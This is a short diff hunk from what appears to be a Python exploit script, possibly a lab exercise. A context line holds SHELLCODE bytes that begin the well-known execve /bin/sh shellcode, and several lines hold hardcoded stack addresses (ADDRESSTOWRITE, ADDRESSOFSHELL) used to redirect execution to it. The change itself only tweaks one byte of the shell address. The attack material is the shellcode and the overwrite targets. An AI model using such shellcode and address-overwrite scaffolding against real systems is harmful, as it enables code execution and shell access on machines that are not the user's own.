@@ -10,7 +10,7 @@ SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x
 
 ADDRESSTOWRITE = b'BFFFE58C'
                  #8C E5 FF BF
-ADDRESSOFSHELL = b'\xBF\xFF\xEA\x9D'
+ADDRESSOFSHELL = b'\xBF\xFF\xEA\x9E'
                 #9D EA FF BF
                 #69 EF FF BF
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
